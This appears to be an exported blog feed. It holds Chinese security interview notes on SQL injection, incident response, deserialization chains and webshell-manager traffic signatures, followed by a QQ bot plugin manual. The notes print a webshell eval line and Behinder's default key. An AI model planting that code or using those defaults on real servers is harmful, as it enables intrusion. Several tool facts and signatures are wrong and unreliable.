<p>时间型盲注特点？常用函数？易受到什么影响？</p>
<ol>
<li><p>场景：应用于无数据回显，无报错，布尔型盲注失效后</p>
</li>
<li><p>特点：时间型盲注页面没有明显的回显，只能根据页面刷新时间的长短来去判断构造语句是否正确；</p>
</li>
<li><p>常用函数: sleep 函数 if 条件语句 等</p>
</li>
<li><p>易受网络波动影响</p>
</li>
</ol>
<p>布尔型盲注特点?常用函数？</p>
<ol>
<li><p>特点:根据页面正确和错误的两种状态，来判断构造语句是否正确</p>
</li>
<li><p>常用函数：</p>
<ol>
<li>length() #用以猜测数据返回字符串的长度</li>
<li>Sunstr() #截取字符串</li>
<li>Mid() #取出字符串的一部分值</li>
<li>Left() #取出字符串左边的几个数据</li>
<li>Ascii() #返回一个字符的 ascii 码值</li>
</ol>
</li>
</ol>
<p>sql 手注的一般步骤</p>
<ol>
<li><p>判断注入点</p>
</li>
<li><p>判断注入类型</p>
</li>
<li><p>判断注入点提交方式</p>
</li>
<li><p>使用 order by 语句查询数据库有多少字段</p>
</li>
<li><p>使用联合查询来查询 union select</p>
<p>User（） 当前用户</p>
<p>Database() 数据库</p>
<p>Version() 数据库版本</p>
</li>
<li><p>查询数据库中的表. 列和值</p>
</li>
</ol>
<h2 id="应急响应问题"><a href="#应急响应问题" class="headerlink" title="应急响应问题"></a>应急响应问题</h2><h3 id="linux-服务器被上传-webshell，如何进行应急"><a href="#linux-服务器被上传-webshell，如何进行应急" class="headerlink" title="linux 服务器被上传 webshell，如何进行应急"></a>linux 服务器被上传 webshell，如何进行应急</h3><ol>
<li><p>在网站的根目录下用下河马或者 d 盾扫下看看，看看能不能扫出 webshell</p>
</li>
<li><p>查看网站的 web 日志，使用 weblshell 会在网站的 web 日志中留下 Webshell 页面的访问数据和数据提交记录，主要特征是少量 ip 对其发起访问，总的访问次数少，该页面属于孤立页面</p>
</li>
<li><p>看下相关设备的告警流量，看下 web shell 的名字和路径，然后在服务器上使用 find 命令进行查找。并删除</p>
</li>
</ol>
<h3 id="hw-期间的应急响应"><a href="#hw-期间的应急响应" class="headerlink" title="hw 期间的应急响应"></a>hw 期间的应急响应</h3><ol>
<li><p>一般先封堵攻击源 IP，事件处置组人员根据攻击事件通报信息或报告，封禁攻击源 IP</p>
</li>
<li><p>事件处置组人员根据攻击事件报告，处置安全事件，处置方式包括：安全设备策略调整、系统下线、服务器排查、应用排查、加固整改、系统上线</p>
</li>
<li><p>上报安全事件，上报接口人根据攻击行为报告和处置报告，对攻击事件、威胁处置上报演习系统上报平台</p>
</li>
</ol>
<h3 id="除了杀进程还有什么方法可以快速找到-webshell-吗？因为有时候占用率高的不一定是木马，也可能是业务相关进程"><a href="#除了杀进程还有什么方法可以快速找到-webshell-吗？因为有时候占用率高的不一定是木马，也可能是业务相关进程" class="headerlink" title="除了杀进程还有什么方法可以快速找到 webshell 吗？因为有时候占用率高的不一定是木马，也可能是业务相关进程"></a>除了杀进程还有什么方法可以快速找到 webshell 吗？因为有时候占用率高的不一定是木马，也可能是业务相关进程</h3><p>看下相关设备的告警流量，看下 webshell 的名字和路径，然后在服务器上使用 find 命令进行查找。</p>
<p>或者在网站的根目录下用下河马或者 d 盾扫下看看，看看能不能扫出 webshell。</p>
<h3 id="应急响应的流程？"><a href="#应急响应的流程？" class="headerlink" title="应急响应的流程？"></a>应急响应的流程？</h3><h3 id="应急响应常用的工具？"><a href="#应急响应常用的工具？" class="headerlink" title="应急响应常用的工具？"></a>应急响应常用的工具？</h3><p>火绒剑、d 盾、河马(linux 和 windows 通用)、微步云沙箱.</p>
<h3 id="查看进程、注册表的工具有了解吗？"><a href="#查看进程、注册表的工具有了解吗？" class="headerlink" title="查看进程、注册表的工具有了解吗？"></a>查看进程、注册表的工具有了解吗？</h3><p>火绒剑可以一键查看进程和注册表. LastActivityView</p>
<h3 id="windows-应急响应"><a href="#windows-应急响应" class="headerlink" title="windows 应急响应"></a>windows 应急响应</h3><ol>
<li><p>进程排查 netstat -ano 查看目前的网络连接，定位可以的 ESTABLISHED,根据 netstat 定位的 pid(进程编号)再通过 taskli st 显示运行本地或远程计算机的所有进程</p>
</li>
<li><p>用户组情况判断 查看服务器中的，dos 命令 net user 查看隐藏的账户注册表 HKEY_LOCAL MACHINE\SAM\SAM\Domains\Acco unt\Users\Names</p>
</li>
<li><p>服务相关判断 运行 command+R m sconfig(打开系统设置)服务</p>
</li>
<li><p>系统启动项排查 msconfig 启动</p>
</li>
<li><p>计划任务创建&#x2F;删除检测 cmd 中 scht asks.exe</p>
</li>
<li><p>注册表的排查注册表的排查，建议使用杀软去做文件排查查看最近访问的目录：recent webshell:D 盾、河马 webshell C2<br>后门：360、卡巴、诺顿</p>
</li>
<li><p>日志排查 windows 登录日志排查运行 eventvwr4624 账号成功登录 4625 账号登录失败</p>
</li>
<li><p>中间件日志排查 不同中间件有不同日志目录看源 p 目的 ul 时间响应码可以用工具：360 星图日志结尾一般为 acess.logo</p>
</li>
</ol>
<h3 id="linux-应急响应"><a href="#linux-应急响应" class="headerlink" title="linux 应急响应"></a>linux 应急响应</h3><ol>
<li><p>文件排查：tmp 目录文件（临时文件）Is-alt &#x2F;tmp</p>
</li>
<li><p>启动项排查：查看开启启动项内容 ls-alt&#x2F;etc&#x2F;init..d&#x2F;</p>
</li>
<li><p>查看命令执行记录：直接 history 或者 cat~&#x2F;bash_history</p>
</li>
<li><p>用户信息排查&#x2F;etc&#x2F;passwd</p>
</li>
<li><p>计划任务排查 crontab 查看当前的计划有那些，是否有后门木马程序启动相关信息</p>
</li>
<li><p>进程排查：netstat-antlp,根据 n etstat 定位出 pid,使用 ps 命令，分析进程 top</p>
</li>
<li><p>系统登录日志排查：ssh 日志：&#x2F;var&#x2F;log&#x2F;lastlog 查看最近登录的记录系统中所有用户最近一次登录信息：lastlog</p>
</li>
<li><p>中间件日志查询 Apache:var&#x2F;log&#x2F;httpd&#x2F;Ngix:var&#x2F;log&#x2F;nginx&#x2F;&#x2F;</p>
</li>
<li><p>后门排查使用河马 webshell&#x2F;find(命令)可以用工具：GScan</p>
</li>
</ol>
<h3 id="勒索病毒的应急响应？"><a href="#勒索病毒的应急响应？" class="headerlink" title="勒索病毒的应急响应？"></a>勒索病毒的应急响应？</h3><ol>
<li><p>首先了解现状、了解发病时间和系统架构，确认被感染的主机</p>
</li>
<li><p>先进行临时处置，对被感染的主机进行网络隔离，禁止使用移动存储设备，对未感染的主机进行 ACL 隔离，关闭 SSH（Linux 的远控），RDP（Windows 的远控）等协议，也不能适用移动存储设。</p>
</li>
<li><p>获取样本，Windows 系统进行文件排查，进程排查，系统信息排查，系统日志排查；Linux 系统排查文件、进程、日志</p>
</li>
<li><p>进行进一步的处置，对已经感染的主机，进行断网隔离，等待解密进展，最后重装系统，对位感染的主机进行补丁修复，还可以使用安全软件进行防护并及时更新病毒库&#x2F;规则库</p>
</li>
<li><p>最后是防御，定期打补丁，部署杀软，对口令策略进行加固，部署流量监测设备。</p>
</li>
</ol>
<h3 id="挖矿应急响应"><a href="#挖矿应急响应" class="headerlink" title="挖矿应急响应"></a>挖矿应急响应</h3><ol>
<li><p>判断</p>
<ol>
<li><p>查看 CPU 占用率（判断 CPU 占用率是否过高）</p>
</li>
<li><p>查看天眼的流量分析，是否去别的有危险的网站下载东西，然后在本地执行了挖矿的一些命令（结合天眼设备分析，看是否去可以网站下载过东西，或在本地执行挖矿命令）</p>
</li>
<li><p>是否有外连，向远程 IP 的请求（netstat -ano 查看所有端口）</p>
</li>
</ol>
</li>
<li><p>事件分析（第二步分析）</p>
<ol>
<li><p>登录网站服务器，查看进程是否有异常；（查看网站服务器是否有异常进程 系统命令 tasklist）</p>
</li>
<li><p>进行查看异常进程的服务项是什么…选择可疑服务项，然后停止服务，其启动类型会变为静止。（并查看它的服务项，尤其是可疑服务（系统命令 services.msc 查看服务项））</p>
</li>
<li><p>进行查看一下计划任务有没有可疑的（查看一下有没有可疑的计划任务）</p>
</li>
</ol>
</li>
<li><p>临时解决方案（最后解决并处置）</p>
<ol>
<li><p>停止并禁用可以服务项，有时候服务项的名称会变，但描述不会变，根据描述快速找到服务项，删除服务项（然后根据描述寻找可疑服务项，停用可疑服务项）</p>
</li>
<li><p>根据实际存在木马的路径，进行删除木马（如果知道木马的路径的话，直接删除木马）</p>
</li>
<li><p>重启服务器</p>
</li>
<li><p>使用杀软全盘查杀</p>
</li>
</ol>
</li>
</ol>
<h3 id="Java-反序列化的-CC-链构造原理"><a href="#Java-反序列化的-CC-链构造原理" class="headerlink" title="Java 反序列化的 CC 链构造原理"></a>Java 反序列化的 CC 链构造原理</h3><p>Java 反序列化的 CC 链构造原理涉及了 Java 反序列化机制、Commons Collections 库中的 Transformer 接口以及漏洞利用的过程。以下是构造 CC 链的基本原理：</p>
<p><strong>Java 反序列化机制：</strong><br>Java 的反序列化机制允许将对象从字节流中重新构建成实例。这个过程涉及到将对象的状态信息从字节流中读取出来，并使用这些信息来构造对象的实例。Java 中的反序列化由 ObjectInputStream 类来执行。</p>
<p><strong>Commons Collections 库中的 Transformer 接口：</strong><br>Commons Collections 库提供了一组 Transformer 接口和实现，用于对对象进行转换和操作。其中，Transformer 接口定义了一个单一方法 transform，用于对输入对象进行转换并返回转换后的对象。攻击者可以构造一个 Transformer 链，将多个 Transformer 对象串联起来，形成一个 CC 链。</p>
<p><strong>漏洞利用过程：</strong><br>构造的 CC 链会利用 Commons Collections 库中的某些 Transformer 实现中的漏洞，通过反序列化触发漏洞，并最终实现攻击者预期的恶意操作。通常情况下，这些漏洞会导致在反序列化过程中执行任意代码或者执行特定的恶意操作。</p>
<p>具体来说，构造 CC 链的过程可能包括以下步骤：</p>
<ol>
<li>选择合适的 Transformer 实现，并组成一个 Transformer 链。</li>
<li>构造一个带有 CC 链的序列化数据，通常使用 Java 的序列化机制实现。</li>
<li>将序列化数据输入到目标应用程序中，通过反序列化触发漏洞，使 CC 链得以执行。</li>
</ol>
<p>最终，CC 链中的 Transformer 将按照预期执行，并实现攻击者的目标，例如执行任意代码或者获取系统权限。</p>
<p>总的来说，Java 反序列化的 CC 链构造原理涉及了利用 Commons Collections 库中的 Transformer 接口和 Java 的反序列化机制，通过构造特定的 Transformer 链并利用漏洞来实现攻击目标。</p>
<h2 id="讲一下-TOP10-有哪些？"><a href="#讲一下-TOP10-有哪些？" class="headerlink" title="讲一下 TOP10 有哪些？"></a>讲一下 TOP10 有哪些？</h2><p>1.失效的访问控制</p>
<p>2.加密机制失效</p>
<p>3.注入（包括跨站脚本攻击 XSS 和 SQL 注入等）</p>
<p>4.不安全设计</p>
<p>5.安全配置错误</p>
<p>6.自带缺陷和过时的组件</p>
<p>7.身份识别和身份验证错误</p>
<p>8.软件和数据完整性故障</p>
<p>9.安全日志和监控故障</p>
<p>10.服务端请求伪造 SSRF</p>
<h2 id="冰蝎、菜刀、蚁剑、哥斯拉的特点"><a href="#冰蝎、菜刀、蚁剑、哥斯拉的特点" class="headerlink" title="冰蝎、菜刀、蚁剑、哥斯拉的特点"></a>冰蝎、菜刀、蚁剑、哥斯拉的特点</h2><p>菜刀：ASP 语言编写的 Windows 远控管理软件，年代比较久，鼻祖级别的，曾经风靡一时，现已经逐渐被其他三个所取代<br>冰蝎：基于 Java 编写，有跨平台特性，流量动态加密（AES128 + 随机密钥）<br>哥斯拉：基于 C#编写，流量加密能过大部分静态查杀和 WAF（查杀和 WAF 也在更新，随时就可能不行了），自带的各种插件功能异常强大<br>蚁剑：基于 Java 编写跨平台远控管理工具，模块化开发，代码简单易懂，可扩展性强</p>
<h2 id="冰蝎、菜刀、蚁剑、哥斯拉的流量特征"><a href="#冰蝎、菜刀、蚁剑、哥斯拉的流量特征" class="headerlink" title="冰蝎、菜刀、蚁剑、哥斯拉的流量特征"></a>冰蝎、菜刀、蚁剑、哥斯拉的流量特征</h2><p>菜刀： 流量特征主要表现在 HTTP 协议上，使用 HTTP 协议通信，控制命令和数据都通过 POST 请求传输。因此，可以通过 HTTP 请求头中的 User-Agent、Referer 等信息进行识别<br>蚁剑： 流量特征主要表现在数据包的加密方式和数据类型。蚁剑使用了 AES 加密算法对数据进行加密，同时还使用了自定义的二进制协议，在通信中传输各种类型的数据<br>冰蝎： 流量特征主要表现在数据包中的特殊标记和传输的数据类型。冰蝎的数据包中包含了特定的标记，如”flag&#x3D;0x52415631”，用于标识该数据包是冰蝎的控制命令。此外，冰蝎还使用了一种自定义的二进制协议，在通信中传输各种类型的数据。<br>哥斯拉： 流量特征主要表现在数据包的特殊标记和数据类型。哥斯拉的数据包中包含了特定的标记，如”XORHEAD”和”XORBODY”，用于标识该数据包是哥斯拉的控制命令。此外，哥斯拉还使用了一种自定义的二进制协议，在通信中传输各种类型的数据</p>
<h2 id="冰蝎的通信原理"><a href="#冰蝎的通信原理" class="headerlink" title="冰蝎的通信原理"></a>冰蝎的通信原理</h2><p>攻击者发送连接请求至服务端，建立 SSL&#x2F;TLS 协议的加密通道，使用 HTTP 协议进行数据传输，并且对数据进行了加密处理，保证通信内容的机密性<br>服务端返回一个随机数作为密钥（目前是 16 位 MD5），存储在 $_SESSION 中返回给客户端<br>客户端输入待执行命令，使用上述返回的密钥进行加密（目前是 AES 128），发送至服务端<br>服务端解密，执行相关命令，并加密执行结果（目前是 AES 128）<br>客户端对执行结果解密<br>固定的请求字节头（dFAXQV1LORcHRQtLRlwMAhwFTAg&#x2F;M 解密后： @error_reporting;\r）和固定的响应字节头（TxcWR1NNExZAD0ZaAWMIPAZjH1BFBFtHThcJSlUXWEd 解密后： {“status”:”c3VjY2Vzcw&#x3D;&#x3D;”,”msg”:”）<br>默认连接密码 rebeyond，冰蝎 4.0 有一串固定密钥 e45e329feb5d925b ，是默认连接密码的 32 位 MD5 值的前 16 位</p>
<h2 id="冰蝎的流量特征"><a href="#冰蝎的流量特征" class="headerlink" title="冰蝎的流量特征"></a>冰蝎的流量特征</h2><p>Accept ： Accept: application&#x2F;json, text&#x2F;javascript, &#x2F;; q&#x3D;0.01<br>Content-Type ：大量的 Content-type: Application&#x2F;x-www-form-urlencoded<br>User-Agent ： 随机的<br>Port：端口通常在 49700 附近<br>代码：webshell 固定代码，不同开发语言的 webshell 代码不同。如 <code>$post=Decrypt(file_get_contents(“php://input”)); eval($post)</code><br>连接：冰蝎为了减少开销，默认使用长链接，请求头和响应头中会带有 Connection: Keep-Alive</p>
<p>冰蝎流量特征<br>2.1 冰蝎 2.0<br>使用<code>AES加密 + base64编码</code>，AES 使用动态密钥对通信进行加密，进行请求时内置了十几个 User-Agent 头，每次请求时会随机选择其中的一个。因此当发现一个 ip 的请求头中的 user-agent 在频繁变换，就可能是冰蝎。<br>2.2 冰蝎 3.0<br>使用 AES 加密 + base64 编码,取消了 2.0 的动态获取密钥，使用固定的连接密钥，AES 加密的密钥为 webshell 连接密码的 MD5 的前 16 位，默认连接密码是”rebeyond”(即密钥是 md5(‘rebeyond’)[0:16]&#x3D;e45e329feb5d925b)。进行请求时内置了十几个 User-Agent 头，每次请求时会随机选择其中的一个。因此当发现一个 ip 的请求头中的 user-agent 在频繁变换，就可能是冰蝎。</p>
<p>3.0 连接 jsp 的 webshell 的请求数据包中的 content-type 字段常见为 application&#x2F;octet-stream。</p>
<p>2.3 冰蝎 4.0<br>提供了传输协议自定义的功能，让用户对流量的加密和解密进行自定义，实现流量加解密协议的去中心化。v4.0 版本不再有连接密码的概念，自定义传输协议的算法就是连接密码。<br>Accept 字段（弱特征），通常是 Accept: application&#x2F;json, text&#x2F;javascript, &#x2F;; q&#x3D;0.01 意思是浏览器可接受任何文件，但最倾向 application&#x2F;json 和 text&#x2F;javascript。<br>Content-Type 字段（弱特征），通常是 Content-type: Application&#x2F;x-www-form-urlencoded<br>与冰蝎的前述版本相似，进行请求时内置了十几个 User-Agent 头，每次请求时会随机选择其中的一个。<br>连接的端口有一定的特征，冰蝎与 webshell 建立连接的同时，java 也与目的主机建立 tcp 连接，每次连接使用本地端口在 49700 左右(就是比较大的端口)，每连接一次，每建立一次新的连接，端口就依次增加。<br>使用长连接，避免了频繁的握手造成的资源开销。默认情况下，请求头和响应头里会带有 Connection：Keep-Alive<br>有固定的请求头和响应头，请求字节头：dFAXQV1LORcHRQtLRlwMAhwFTAg&#x2F;M ，响应字节头：TxcWR1NNExZAD0ZaAWMIPAZjH1BFBFtHThcJSlUXWEd<br>默认时，冰蝎 webshell 都有“e45e329feb5d925b” 一串密钥，与冰蝎 3.0 相同。 3. 哥斯拉流量特征<br>哥斯拉支持多种加密方式，采用了和冰蝎 2.0 类似的密钥交换方式。它的 webshell 需要动态生成，可以根据需求选择不同的加密方式。</p>
<p>3.1 哥斯拉静态特征<br>在默认脚本编码的情况下，jsp 会出现 xc、pass 字符和 Java 反射(ClassLoader，getClass().getClassLoader())，base64 加解码等特征。</p>
<p>3.2 哥斯拉动态特征<br>User-Agent 字段（弱特征），如果采用默认的情况，会暴露使用的 jdk 信息。不过哥斯拉支持自定义 HTTP 头部，这个默认特征是可以很容易去除的。<br>Accept 字段（弱特征），默认是 Accept:text&#x2F;html, image&#x2F;gif, image&#x2F;jpeg, *; q&#x3D;.2, &#x2F;; q&#x3D;.2。同上，这个也可修改，只能作为辅助检测的特征。<br>Cookie 中有一个非常关键的特征，最后会有个分号。估计后续的版本会修复。<br>响应体的数据有一定特征，哥斯拉会把一个 32 位的 md5 字符串按照一半拆分，分别放在 base64 编码的数据的前后两部分。整个响应包的结构体征为：md5 前十六位+base64+md5 后十六位。</p>
<p><a class="link"   href="https://www.cnblogs.com/-andrea/p/17473499.html#/" >https://www.cnblogs.com/-andrea/p/17473499.html#/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
      <categories>
        <category>HW</category>
      </categories>
      <tags>
        <tag>HW</tag>
      </tags>
  </entry>
  <entry>
    <title>HuYanSession2——壶言会话2使用手册</title>
    <url>/posts/7a43906e.html</url>
    <content><![CDATA[<p><a class="link"   href="https://mirai.mamoe.net/topic/1377/%E5%A3%B6%E8%A8%802-huyansession2-%E5%A3%B6%E8%A8%80%E4%BC%9A%E8%AF%9D2" >壶言手册发布页<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h2 id="自定义回复"><a href="#自定义回复" class="headerlink" title="自定义回复"></a><strong>自定义回复</strong></h2><p><code>权限id：session</code></p>
<h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><p>所有自定义回复都会携带作用域和匹配方式参数！<br>支持更简洁的输入且都是可选！默认为<code>精准</code>和<code>全局</code>！</p>
<p><code>[]</code>和<code>()</code>指数学中的域，在本插件表示<code>可填写</code>和<code>必填写</code>；<br><code>|</code>为或，表示两边都可以用；</p>
<p><strong>以下所有指令均适用于此表示方法!</strong></p>
<ul>
<li><code>[精准|1]</code> 精准匹配</li>
<li><code>[模糊|2]</code> 模糊匹配</li>
<li><code>[头部|3]</code> 头部匹配</li>
<li><code>[结尾|4]</code> 结尾匹配</li>
<li><code>[全局|0]</code> 全局匹配</li>
<li><code>[当前|-1]</code> 当前群匹配</li>
<li><code>[群组(id)|gr(id)]</code> 指定群组匹配</li>
</ul>
<p>具体参数含义可以去壶言1查看</p>
<hr>
<h3 id="一对一回复-会话"><a href="#一对一回复-会话" class="headerlink" title="一对一回复(会话)"></a>一对一回复(会话)</h3><p><code>权限id：sessionx</code></p>
<p>直接上指令</p>
<table>
<thead>
<tr>
<th align="left">指令</th>
<th align="left">含义</th>
<th align="left">案例</th>
<th align="left">中文格式</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>xx (触发内容) (回复内容) [参数]</code></td>
<td align="left">快速添加关键字回复 参数可多填，以空格隔开</td>
<td align="left"><code>xx 怎么办 凉拌 2 0</code></td>
<td align="left"><code>学习 怎么办 凉拌 模糊 全局</code></td>
</tr>
<tr>
<td align="left"><code>xx：[触发内容]</code></td>
<td align="left">查询所有已保存的关键词回复,冒号中英都支持，后续的触发内容填上就是查询对应的那条</td>
<td align="left"><code>xx:</code></td>
<td align="left"><code>查询 怎么办</code></td>
</tr>
<tr>
<td align="left"><code>-xx：(触发内容)</code></td>
<td align="left">删除对应的关键词</td>
<td align="left"><code>-xx:怎么办</code></td>
<td align="left"><code>删除 怎么办</code></td>
</tr>
<tr>
<td align="left"><code>%xx</code></td>
<td align="left">通过多次消息发送的形式添加对话,便于手机使用</td>
<td align="left"><code>%xx</code></td>
<td align="left"><code>学习对话</code></td>
</tr>
<tr>
<td align="left"><code>-%xx</code></td>
<td align="left">由于多次消息形式添加的对话的触发词可能含有空格，因此要用对应的方式删除</td>
<td align="left"><code>-%xx</code></td>
<td align="left"><code>删除对话</code></td>
</tr>
</tbody></table>
<p>学习对话参数：</p>
<ul>
<li><code>0 | 全局</code> 修改触发作用域为这个机器人的所有群</li>
<li><code>1 | 精准</code> 只有发的消息跟触发词相同，才能触发回复，<code>不填写参数默认</code></li>
<li><code>2 | 模糊</code> 发送消息包含触发词即可触发。</li>
<li><code>3 | 头部</code> 发送消息的开头为触发词即可触发</li>
<li><code>4 | 结尾</code> 发送消息的结尾为触发词即可触发</li>
<li><code>5 | 正则</code> 以正则匹配触发消息，仅限<code>%xx</code>学习功能</li>
<li><code>-1 | 当前</code> 修改触发作用域为当期这个群，<code>不填写参数默认</code></li>
<li><code>gr(id) | 群组(id)</code> 修改作用域为对应的群组id，()不是指令，只是说明这个<code>id</code>必须填写，群组的使用方式在下方</li>
</ul>
<p>所有参数都在聊天指令的结尾以<code>(空格)(参数)</code>添加，无序。</p>
<p>对话和多词条支持的动态消息：</p>
<p>欢迎词支持的动态消息:</p>
<table>
<thead>
<tr>
<th align="left">动态消息类型</th>
<th align="left">动态消息参数</th>
<th align="left">含义</th>
<th align="left">案例</th>
<th align="left">匹配结果</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>at</code></td>
<td align="left"><code>this</code></td>
<td align="left">@(at)触发这条消息的人</td>
<td align="left"><code>$at(this)</code></td>
<td align="left">@放空</td>
</tr>
<tr>
<td align="left"></td>
<td align="left"><code>qq</code></td>
<td align="left">@群里的这个人，会固定@这个人</td>
<td align="left"><code>$at(572490972)</code></td>
<td align="left">@放空</td>
</tr>
<tr>
<td align="left"><code>message</code></td>
<td align="left"><code>this</code></td>
<td align="left">这个人触发这条消息的内容</td>
<td align="left"><code>$message(this)</code></td>
<td align="left">不会写插件怎么办？</td>
</tr>
<tr>
<td align="left"><code>user</code></td>
<td align="left"><code>name</code></td>
<td align="left">获取这个人的名称</td>
<td align="left"><code>$user(name)</code></td>
<td align="left">放空</td>
</tr>
<tr>
<td align="left"></td>
<td align="left"><code>id</code></td>
<td align="left">获取这个人的qq</td>
<td align="left"><code>$user(id)</code></td>
<td align="left">572490972</td>
</tr>
<tr>
<td align="left"></td>
<td align="left"><code>avatar</code></td>
<td align="left">获取这个人的头像</td>
<td align="left"><code>$user(avatar)</code></td>
<td align="left">[图片]</td>
</tr>
<tr>
<td align="left"></td>
<td align="left"><code>title</code></td>
<td align="left">获取这个人的头衔，优先获取特殊头衔</td>
<td align="left"><code>$user(title)</code></td>
<td align="left">才不是放空了~</td>
</tr>
<tr>
<td align="left"></td>
<td align="left"><code>info</code></td>
<td align="left">详细信息??</td>
<td align="left"><code>$user(info)</code></td>
<td align="left"></td>
</tr>
<tr>
<td align="left"><code>time</code></td>
<td align="left"><code>now</code></td>
<td align="left">获取当前时间，默认格式<code>yyyy-MM-dd HH:mm:ss</code></td>
<td align="left"><code>$time(now)</code></td>
<td align="left">2022-8-28 02:15:15</td>
</tr>
<tr>
<td align="left"></td>
<td align="left"><code>(时间格式)</code></td>
<td align="left">按照指定的时间格式进行现在的时间输出</td>
<td align="left"><code>$time(HH:mm:ss)</code></td>
<td align="left">02:16:20</td>
</tr>
</tbody></table>
<hr>
<h3 id="正则消息回流-仅限一对一回复"><a href="#正则消息回流-仅限一对一回复" class="headerlink" title="正则消息回流(仅限一对一回复)"></a>正则消息回流(仅限一对一回复)</h3><p>请以<code>%xx</code>学习，学习内容为<code>(你的正则1)</code>，与之对应的回复内容为<code>$mate(1)</code>，<br>参数为5，也就是正则匹配，1对应第一个括号匹配的内容。</p>
<p>案例：</p>
<p>与之类似的，你只需要更改括号中正则，就可以达到你想要的东西。</p>
<hr>
<h3 id="一对多回复-多词条"><a href="#一对多回复-多词条" class="headerlink" title="一对多回复(多词条)"></a>一对多回复(多词条)</h3><p><code>权限id：sessiondct</code><br>指令:</p>
<table>
<thead>
<tr>
<th align="left">指令</th>
<th align="left">含义</th>
<th align="left">案例</th>
<th align="left">中文格式</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>%dct</code></td>
<td align="left">添加多词条</td>
<td align="left"><code>%dct</code></td>
<td align="left"><code>添加多词条</code></td>
</tr>
<tr>
<td align="left"><code>dct:</code></td>
<td align="left">查询所有多词条</td>
<td align="left"><code>%dct</code></td>
<td align="left"><code>查询多词条</code></td>
</tr>
<tr>
<td align="left"><code>-dct:(id) [id]</code></td>
<td align="left">删除多词条，id通过查询得到，第一个id是对应的多次条id，第二个id是对应回复语句id，如果填写，就是删除这个多次回复语句下的这条回复，支持空格隔开一次删除多条</td>
<td align="left"><code>-dct：5</code></td>
<td align="left"><code>删除：2 34 44 23</code></td>
</tr>
</tbody></table>
<p>在添加多词条消息的途中，<br>发送</p>
<ul>
<li><code>!!! | ！！！</code> 结束添加，不进行保存，直接结束这次操作</li>
<li><code>!! | ！！</code> 在循环添加回复内容时，停止添加，退出进行多词条消息的保存</li>
<li><code>! | ！</code> 删除上一条添加的内容</li>
</ul>
<p>添加多词条参数：</p>
<ul>
<li><code>1 | 精准</code> 只有发的消息跟触发词相同，才能触发回复，<code>不填写参数默认</code></li>
<li><code>2 | 模糊</code> 发送消息包含触发词即可触发。</li>
<li><code>3 | 头部</code> 发送消息的开头为触发词即可触发</li>
<li><code>4 | 结尾</code> 发送消息的结尾为触发词即可触发</li>
<li><code>lx | 轮询</code> 多个词条回复的顺序为轮询，就是一条一条发送去,<code>不填写参数默认</code></li>
<li><code>sj | 随机</code> 修改回复顺序为随机,就是触发后随机从多词条中取一条拿来回复</li>
<li><code>0 | 全局</code> 修改触发作用域为这个机器人的所有群</li>
<li><code>gr(id) | 群组(id)</code> 修改作用域为对应的群组id，()不是指令，只是说明这个<code>id</code>必须填写</li>
</ul>
<p>单个多词条回复语句也支持动态消息，具体支持看上面的对话动态消息支持</p>
<hr>
<h2 id="群组"><a href="#群组" class="headerlink" title="群组"></a>群组</h2><p><code>权限id：list</code><br>用于设定特定几个群的群组系统，用于一些东西只在这几个群中触发，其他插件有个相反的功能叫群黑名单，我这个是正向的，只在那些群触发。</p>
<p>指令：</p>
<table>
<thead>
<tr>
<th align="left">指令</th>
<th align="left">含义</th>
<th align="left">案例</th>
<th align="left">中文格式</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>+gr:(id) (群号)</code></td>
<td align="left">添加多个群为一个群组，群号支持多个</td>
<td align="left"><code>+gr：1 780594692</code></td>
<td align="left"><code>添加群组：1 780594692 390444068</code></td>
</tr>
<tr>
<td align="left"><code>gr:[id]</code></td>
<td align="left">查询所有群组信息，id填写后只查询对应的id所属群组信息</td>
<td align="left"><code>gr：</code></td>
<td align="left"><code>查询群组：1</code></td>
</tr>
<tr>
<td align="left"><code>-gr:(id) [群号]</code></td>
<td align="left">删除这个群组里面的某个群号，支持多个群号</td>
<td align="left"><code>-gr:1</code></td>
<td align="left"><code>删除群组：1 390444068 780594692</code></td>
</tr>
</tbody></table>
<p>与之类似，你只需要更换你的正则匹配就可以</p>
<hr>
<h2 id="定时器"><a href="#定时器" class="headerlink" title="定时器"></a>定时器</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">权限id：ds</span><br></pre></td></tr></table></figure></div>

<p>定时任务是指，按照指定的时间频率发送对应的消息，时间频率是<a class="link"   href="http://cron.ciding.cc/#/" >cron表达式<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，不懂的人可以花5分钟了解一下，基本能满足任何时间频率<br>cron输入格式<code>$cron(* * * * * ?)</code></p>
<h3 id="定时管理"><a href="#定时管理" class="headerlink" title="定时管理"></a>定时管理</h3><p>指令:</p>
<table>
<thead>
<tr>
<th align="left">指令</th>
<th align="left">含义</th>
<th align="left">案例</th>
<th align="left">中文格式</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>%ds</code></td>
<td align="left">添加定时任务，具体根据提示进行添加</td>
<td align="left"><code>%ds</code></td>
<td align="left">&#96;添加定时器</td>
</tr>
<tr>
<td align="left"><code>-ds(id)</code></td>
<td align="left">删除定时任务，id查询获得</td>
<td align="left"><code>-ds：1</code></td>
<td align="left">&#96;删除定时器：1</td>
</tr>
</tbody></table>
<p>在添加回复消息的途中，<br>发送</p>
<ul>
<li><code>!!! | ！！！</code> 结束添加，不进行保存，直接结束这次操作</li>
<li><code>!! | ！！</code> 在循环添加回复内容时，停止添加，退出进行定时任务的保存</li>
<li><code>! | ！</code> 删除上一条添加的内容</li>
</ul>
<p>定时任务的参数：</p>
<ul>
<li><code>hf | 回复</code> 定时器触发后只回复一条消息，<code>不填参数默认</code></li>
<li><code>lx | 轮询</code> 定时器的回复内容将成为多词条的样式，并且回复词条顺序为轮询，与随机冲突！</li>
<li><code>sj | 随机</code> 定时器的回复内容将成为多词条的样式，并且回复词条顺序为随机，与轮询冲突！</li>
<li><code>-1 | 当前</code> 作用域-当前这个群 <code>默认</code></li>
<li><code>0 | 全局</code> 作用域-全部群</li>
<li><code>gr(id) | 群组(id)</code> 作用域-指定群组</li>
</ul>
